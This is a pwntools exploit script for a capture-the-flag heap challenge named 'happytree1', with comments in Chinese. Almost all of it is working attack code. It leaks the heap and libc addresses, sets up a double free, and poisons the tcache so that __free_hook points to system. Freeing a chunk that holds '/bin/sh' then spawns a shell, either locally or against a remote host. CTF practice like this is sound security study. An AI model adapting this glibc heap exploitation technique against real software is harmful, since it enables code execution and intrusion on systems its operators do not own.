#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './happytree1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


def eat():
    p.recvuntil('cmd> ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('data: ')
    p.sendline(str(size))
    p.recvuntil('content: ')
    p.send(con)

def dele(size):
    eat()
    p.sendline('2')
    p.recvuntil('data: ')
    p.sendline(str(size))

def show(size):
    eat()
    p.sendline('3')
    p.recvuntil('data: ')
    p.sendline(str(size))


# leak heapbase
#* 让两个 unsorted 互指,97和98 是 unsorted
#* 一共九个
for i in range(0x90,0x98+1):
    add(i, '1')

for i in range(0x98,0x90-1,-1):
    dele(i)

add(0x90, 'a')#* 利用 tcache 上残留的 fd
show(0x90)
p.recvuntil('content: ')
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x12161
log.success("heapbase: "+hex(heapbase))

for i in range(0x91,0x96+1):
    add(i, '/bin/sh\x00')

add(0x97, 'a'*8)#* 利用 unsorted
show(0x97)
p.recvuntil('content: aaaaaaaa')
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
log.success("libc.address: "+hex(libc.address))
malloc_hook = libc.symbols['__malloc_hook']
log.success('malloc_hook: ' + hex(malloc_hook))
free_hook = libc.symbols['__free_hook']
log.success('free_hook: ' + hex(free_hook))
system = libc.symbols['system']
log.success("system: " + hex(system))

add(0x40, '1')#* 98 多个 leftchain，后面才有地方放
add(0x30, '1')#* 0x30 的 tcache 烂掉了，需要 free 一个进去

dele(0x40)#* 为了填充tcahce 使 tcache 最后进去的有 fd

dele(0x96)#* 95->97

add(0x98,'a')#* 96 为 double free 做准备 这样就有两个指针指向 97



heapfd = heapbase + 0x11f40
log.success("heapfd: " + hex(heapfd))
dele(0x97)#* first free 97
dele(heapfd&0xffffffff)#* second free 97

add(0x8b, p64(free_hook))
dele(0x30)

add(0x8a, '1')#* 拿出多余的 tcache

add(0x89, p64(system))
dele(0x91)

p.interactive()
